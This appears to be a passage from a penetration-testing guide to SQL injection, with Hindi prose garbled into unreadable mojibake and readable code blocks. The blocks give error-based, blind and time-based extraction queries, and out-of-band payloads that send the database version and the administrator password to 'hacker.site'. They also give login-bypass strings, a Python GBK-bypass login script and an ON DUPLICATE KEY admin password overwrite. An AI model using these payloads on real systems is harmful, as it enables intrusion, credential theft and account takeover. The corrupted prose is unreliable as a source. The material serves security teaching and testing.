рдЬрдм рдХреНрд╡реЗрд░реА рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпреВрдирд┐рдпрди рдЖрдзрд╛рд░рд┐рдд рдЗрдиреНрдЬреЗрдХреНрд╢рди рд╕рдВрднрд╛рд╡рдирд╛рд╢реАрд▓ рдирд╣реАрдВ рд▓рдЧрддрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ **рдЫрд┐рдкреА рд╣реБрдИ рдпреВрдирд┐рдпрди рдЖрдзрд╛рд░рд┐рдд рдЗрдиреНрдЬреЗрдХреНрд╢рди** рдореМрдЬреВрдж рд╣реИред рдпрд╣ рдкрд░рд┐рджреГрд╢реНрдп рдЕрдХреНрд╕рд░ рдПрдХ рдЕрдВрдзрд╛ рдЗрдиреНрдЬреЗрдХреНрд╢рди рд╕реНрдерд┐рддрд┐ рдХреА рдУрд░ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рдЕрдВрдзрд╛ рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХреЛ рдпреВрдирд┐рдпрди рдЖрдзрд╛рд░рд┐рдд рдореЗрдВ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП, рдмреИрдХрдПрдВрдб рдкрд░ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХреНрд╡реЗрд░реА рдХреЛ рд╕рдордЭрдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

рдЗрд╕реЗ рдЖрдкрдХреЗ рд▓рдХреНрд╖реНрдп рдбреЗрдЯрд╛рдмреЗрд╕ рдкреНрд░рдмрдВрдзрди рд╕рд┐рд╕реНрдЯрдо (DBMS) рдХреЗ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рддрд╛рд▓рд┐рдХрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЕрдВрдзрд╛ рдЗрдиреНрдЬреЗрдХреНрд╢рди рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрди рдбрд┐рдлрд╝реЙрд▓реНрдЯ рддрд╛рд▓рд┐рдХрд╛рдУрдВ рдХреЛ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП, рд▓рдХреНрд╖реНрдп DBMS рдХреА рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдкрд░ рд╕рд▓рд╛рд╣ рджреА рдЬрд╛рддреА рд╣реИред

рдПрдХ рдмрд╛рд░ рдХреНрд╡реЗрд░реА рдирд┐рдХрд╛рд▓ рд▓реА рдЧрдИ рд╣реИ, рдореВрд▓ рдХреНрд╡реЗрд░реА рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдмрдВрдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рдж, рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдореЗрдВ рдПрдХ рдпреВрдирд┐рдпрди рдХреНрд╡реЗрд░реА рдЬреЛрдбрд╝реА рдЬрд╛рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдирдП рдЙрдкрд▓рдмреНрдз рдпреВрдирд┐рдпрди рдЖрдзрд╛рд░рд┐рдд рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХрд╛ рд╢реЛрд╖рдг рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рддреА рд╣реИред

рдЕрдзрд┐рдХ рд╡реНрдпрд╛рдкрдХ рдЕрдиреБрднрд╡ рдХреЗ рд▓рд┐рдП, [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f) рдкрд░ рдЙрдкрд▓рдмреНрдз рдкреВрд░реЗ рд▓реЗрдЦ рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрдЦреЗрдВред

## рддреНрд░реБрдЯрд┐ рдЖрдзрд╛рд░рд┐рдд рд╢реЛрдз

рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ рдЖрдк **рдХреНрд╡реЗрд░реА** рдХрд╛ **рдЖрдЙрдЯрдкреБрдЯ** рдирд╣реАрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЖрдк **рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢** рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдбреЗрдЯрд╛ рдХреЛ **рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓** рд╕рдХрддреЗ рд╣реИрдВред\
рдпреВрдирд┐рдпрди рдЖрдзрд╛рд░рд┐рдд рд╢реЛрдзрди рдореЗрдВ рдПрдХ рд╣реА рдлреНрд▓реЛ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдП рдЖрдк рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## рдмреНрд▓рд╛рдЗрдВрдб SQLi рдХрд╛ рд╢реЛрд╖рдг

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рдХреНрд╡реЗрд░реА рдпрд╛ рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреЗ рдкрд░рд┐рдгрд╛рдо рдирд╣реАрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЖрдк рдпрд╣ рдкрд╣рдЪрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрд╡реЗрд░реА рдПрдХ рд╕рдЪреНрдЪрд╛ рдпрд╛ рдПрдХ рдЧрд▓рдд рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╡рд╛рдкрд╕ рдХрд░рддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдкреГрд╖реНрда рдкрд░ рд╡рд┐рднрд┐рдиреНрди рд╕рд╛рдордЧреНрд░реА рд╣реИред\
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЖрдк рдЙрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдПрдХ рдЪрд╛рд░ рд╕реЗ рдЪрд╛рд░ рдбрдВрдк рдХрд░ рд╕рдХреЗрдВ:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## рддреНрд░реБрдЯрд┐ рдЕрдВрдзрд╛ SQLi рдХрд╛ рд╢реЛрд╖рдг

рдпрд╣ **рдкрд╣рд▓реЗ рдЬреИрд╕рд╛ рд╣реА рдорд╛рдорд▓рд╛ рд╣реИ** рд▓реЗрдХрд┐рди рдкреВрдЫреЗ рдЧрдП рдкреНрд░рд╢реНрди рд╕реЗ рд╕рдЪ/рдЭреВрда рдХрд╛ рдЕрдВрддрд░ рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп рдЖрдк рдПрд╕рдХреНрдпреВрдПрд▓ рдХреНрд╡реЗрд░реА рдореЗрдВ рддреНрд░реБрдЯрд┐ рдХреЛ рдкрд╣рдЪрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдирд╣реАрдВ (рд╢рд╛рдпрдж HTTP рд╕рд░реНрд╡рд░ рдХреНрд░реИрд╢ рд╣реЛ рдЬрд╛рдП)ред рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рдкреНрд░рддреНрдпреЗрдХ рдмрд╛рд░ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдЕрдХреНрд╖рд░ рдХреА рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рддреЗ рд╕рдордп рдПрдХ рдПрд╕рдХреНрдпреВрдПрд▓ рддреНрд░реБрдЯрд┐ рдХреЛ рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## рдЯрд╛рдЗрдо рдмреЗрд╕реНрдб SQLi рдХрд╛ рд╢реЛрд╖рдг

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдХрд┐рд╕реА рднреА рддрд░рд╣ рд╕реЗ рдХреНрд╡реЗрд░реА рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкреГрд╖реНрда рдХреЗ рд╕рдВрджрд░реНрдн рдкрд░ рднрд┐рдиреНрди рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рддрд░реАрдХрд╛ рдирд╣реАрдВ рд╣реИред рд▓реЗрдХрд┐рди, рдпрджрд┐ рдЕрдиреБрдорд╛рдирд┐рдд рд╡рд░реНрдг рд╕рд╣реА рд╣реИ рддреЛ рдкреГрд╖реНрда рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╕рдордп рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВред рд╣рдо рдкрд╣рд▓реЗ рд╣реА рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рджреЗрдЦ рдЪреБрдХреЗ рд╣реИрдВ рддрд╛рдХрд┐ [рдПрдХ SQLi рд╕реБрд░рдХреНрд╖рд┐рддрддрд╛ рджреЛрд╖ рдХреА рдкреБрд╖реНрдЯрд┐ рдХреА рдЬрд╛ рд╕рдХреЗ](./#confirming-with-timing)ред
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Stacked Queries

рдЖрдк рд╕реНрдЯреИрдХреНрдб рдХреНрд╡реЗрд░реАрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдПрдХрд╛рдзрд┐рдХ рдХреНрд╡реЗрд░реАрдЬ рдХреЛ рд▓рдЧрд╛рддрд╛рд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЬрдм рднреАрддрд░реА рдХреНрд╡реЗрд░реАрдЬ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреА рд╣реИрдВ, **рдкрд░рд┐рдгрд╛рдо** **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╡рд╛рдкрд╕ рдирд╣реАрдВ рднреЗрдЬреЗ рдЬрд╛рддреЗ**ред рдЗрд╕рд▓рд┐рдП рдпрд╣ рддрдХрдиреАрдХ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ **рдЕрдВрдзреЗ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖реЛрдВ** рдХреЗ рд╕рдВрдмрдВрдз рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реИ рдЬрд╣рд╛рдБ рдЖрдк рдПрдХ рджреВрд╕рд░реА рдХреНрд╡реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ DNS рд▓реБрдХрдЕрдк, рд╢рд░реНрддрдореБрдХреНрдд рддреНрд░реБрдЯрд┐, рдпрд╛ рд╕рдордп рджреЗрд░реА рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**Oracle** рд╕реНрдЯреИрдХреНрдб рдХреНрд╡реЗрд░реАрдЬ рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред **MySQL, Microsoft** рдФрд░ **PostgreSQL** рдЗрдиреНрд╣реЗрдВ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ: `QUERY-1-HERE; QUERY-2-HERE`

## Out of band Exploitation

рдЕрдЧрд░ **рдХреЛрдИ рдЕрдиреНрдп** рдЙрддреНрдкреАрдбрд╝рди рд╡рд┐рдзрд┐ **рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддреА** рд╣реИ, рддреЛ рдЖрдк рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдмрд╛рд╣реНрдп рд╣реЛрд╕реНрдЯ рдкрд░ рдирд┐рдХрд╛рд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, DNS рдХреНрд╡реЗрд░реАрдЬ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### рдПрдХреНрд╕рдПрдХреНрд╕рдИ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрдЙрдЯ рдСрдл рдмреИрдВрдб рдбреЗрдЯрд╛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрд╢рди
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд╢реЛрдзрди

[**sqlmap**](https://github.com/sqlmapproject/sqlmap) рдХреЗ рд╕рд╛рде рдПрдХ SQLi рджреБрд░реБрдкрдпреЛрдЧ рдХреЛ рд╢реЛрдзрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [SQLMap Cheetsheat](sqlmap/) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВред

## рддрдХрдиреАрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЬрд╛рдирдХрд╛рд░реА

рд╣рдордиреЗ рдкрд╣рд▓реЗ рд╣реА рдПрдХ SQL Injection рджреБрд░реБрдкрдпреЛрдЧ рдХреЛ рд╢реЛрдзрди рдХрд░рдиреЗ рдХреЗ рд╕рднреА рддрд░реАрдХреЗ рдЪрд░реНрдЪрд╛ рдХреА рд╣реИред рдЗрд╕ рдкреБрд╕реНрддрдХ рдореЗрдВ рдбреЗрдЯрд╛рдмреЗрд╕ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдкрд░ рдирд┐рд░реНрднрд░ рдХреБрдЫ рдФрд░ рддрд░рдХреАрдмреЗрдВ рдЦреЛрдЬреЗрдВ:

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

рдпрд╛ рдЖрдкрдХреЛ **MySQL, PostgreSQL, Oracle, MSSQL, SQLite рдФрд░ HQL рдХреЗ рд╕рдВрдмрдВрдз рдореЗрдВ рдмрд╣реБрдд рд╕рд╛рд░реА рддрд░рдХреАрдмреЗрдВ** рдорд┐рд▓реЗрдВрдЧреА [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)



<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛтАЛтАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) рд╕реНрдкреЗрди рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдШрдЯрдирд╛ рд╣реИ рдФрд░ рдпреВрд░реЛрдк рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ** рдХреЗ рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рд╕рдореНрдореЗрд▓рди рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рд╣рд░ рд╢рд╛рдЦрд╛ рдореЗрдВ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡реНрдпрд╛рд╡рд╕рд╛рдпрд┐рдХреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрддреНрддреЗрдЬрдХ рдорд┐рд▓рди рд╕реНрдерд▓ рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

## рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрд╛рдпрдкрд╛рд╕

рд▓реЙрдЧрд┐рди рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реВрдЪреА:

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### рд░реЙ рд╣реИрд╢ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрд╛рдпрдкрд╛рд╕
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
рдпрд╣ рдХреНрд╡реЗрд░реА рдПрдХ рдХрдордЬреЛрд░реА рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддреА рд╣реИ рдЬрдм MD5 рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рддреНрдп рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд╛рдВрдЪ рдореЗрдВ рд░реЙ рдЖрдЙрдЯрдкреБрдЯ рдХреЗ рд╕рд╛рде, рдЬрд┐рд╕рд╕реЗ рд╕рд┐рд╕реНрдЯрдо SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рд╡реЗ рдЗрдирдкреБрдЯ рдХреЛ рддреИрдпрд╛рд░ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ, рдЬрдм рд╣реИрд╢ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд SQL рдХрдорд╛рдВрдб рднрд╛рдЧреЛрдВ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рдорд┐рд▓рддреА рд╣реИред
```sql
md5("ffifdyop", true) = 'or'6я┐╜]я┐╜я┐╜!r,я┐╜я┐╜bя┐╜
sha1("3fDf ", true) = Qя┐╜u'='я┐╜@я┐╜[я┐╜tя┐╜- oя┐╜я┐╜_-!
```
### рдЗрдВрдЬреЗрдХреНрдЯреЗрдб рд╣реИрд╢ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрд╛рдпрдкрд╛рд╕
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**рд╕реБрдЭрд╛рдИ рдЧрдИ рд╕реВрдЪреА**:

рдЖрдкрдХреЛ рдкреНрд░рддреНрдпреЗрдХ рдкрдВрдХреНрддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдордХреЗ рд░реВрдк рдореЗрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рд╣рдореЗрд╢рд╛ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд░реВрдк рдореЗрдВ: _**Pass1234.**_\
_(рдпреЗ рдкреЗрд▓реЛрдб рдЗрд╕ рд╕реЗрдХреНрд╢рди рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдмрдбрд╝реА рд╕реВрдЪреА рдореЗрдВ рднреА рд╢рд╛рдорд┐рд▓ рд╣реИрдВ)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрд╛рдЗрдкрд╛рд╕

рдпрджрд┐ ' рдХреЛ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк %A8%27 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЬрдм ' рдХреЛ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдпрд╣ рдмрдирд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛: 0xA80x5c0x27 (_тХШ'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Python рд╕реНрдХреНрд░рд┐рдкреНрдЯ:
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### рдкреЙрд▓реАрдЧреНрд▓реЙрдЯ рдЗрдиреНрдЬреЗрдХреНрд╢рди (рдорд▓реНрдЯреАрдХреЙрдиреНрдЯреЗрдХреНрд╕реНрдЯ)
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## рдЗрдиреНрд╕рд░реНрдЯ рд╕реНрдЯреЗрдЯрдореЗрдВрдЯ

### рдореМрдЬреВрджрд╛ рдСрдмреНрдЬ
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдХреБрдВрдЬреА рдЕрдкрдбреЗрдЯ

`ON DUPLICATE KEY UPDATE` рдХреНрд▓реЙрдЬ MySQL рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдмрддрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдХрд┐ рдЬрдм рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИ рдХрд┐ рдПрдХ рдкрдВрдХреНрддрд┐ рдбрд╛рд▓реА рдЬрд╛рдП рдЬреЛ рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рд╕реВрдЪрдХрд╛рдВрдХ рдпрд╛ рдкреНрд░рд╛рдердорд┐рдХ рдХреБрдВрдЬреА рдореЗрдВ рдПрдХ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдорд╛рди рджреЗрдЧреА, рддреЛ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдХреНрдпрд╛ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рд╕реБрд╡рд┐рдзрд╛ рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рддрд╛рдХрд┐ рдПрдХ рдкреНрд░рд╢рд╛рд╕рдХ рдЦрд╛рддреЗ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ:

рдЙрджрд╛рд╣рд░рдг рдкреЗрд▓реЛрдб рдЗрдиреНрдЬреЗрдХреНрд╢рди:

рдПрдХ рдЗрдиреНрдЬреЗрдХреНрд╢рди рдкреЗрд▓реЛрдб рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░реВрдк рдореЗрдВ рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд╣рд╛рдВ `users` рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рджреЛ рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЛ рдбрд╛рд▓рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред рдкрд╣рд▓реА рдкрдВрдХреНрддрд┐ рдПрдХ рдЫрд▓рдХрд╛ рд╣реИ, рдФрд░ рджреВрд╕рд░реА рдкрдВрдХреНрддрд┐ рдореМрдЬреВрджрд╛ рдкреНрд░рд╢рд╛рд╕рдХ рдХреЗ рдИрдореЗрд▓ рдХреЛ рд▓рдХреНрд╖реНрдп рдмрдирд╛рдХрд░ рдкрд╛рд╕рд╡рд░реНрдб рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд░рдЦрддреА рд╣реИ:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ:

- рдХреНрд╡реЗрд░реА рджреЛ рдкрдВрдХреНрддрд┐рдпрд╛рдБ рдбрд╛рд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреА рд╣реИ: рдПрдХ `generic_user@example.com` рдХреЗ рд▓рд┐рдП рдФрд░ рджреВрд╕рд░рд╛ `admin_generic@example.com` рдХреЗ рд▓рд┐рдПред
- рдЕрдЧрд░ `admin_generic@example.com` рдХреЗ рд▓рд┐рдП рдкрдВрдХреНрддрд┐ рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рд╣реИ, рддреЛ `ON DUPLICATE KEY UPDATE` рдХреНрд▓реЙрдЬрд╝ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ MySQL рдХреЛ рдореМрдЬреВрджрд╛ рдкрдВрдХреНрддрд┐ рдХреЗ `password` рдлрд╝реАрд▓реНрдб рдХреЛ "bcrypt_hash_of_newpassword" рдореЗрдВ рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
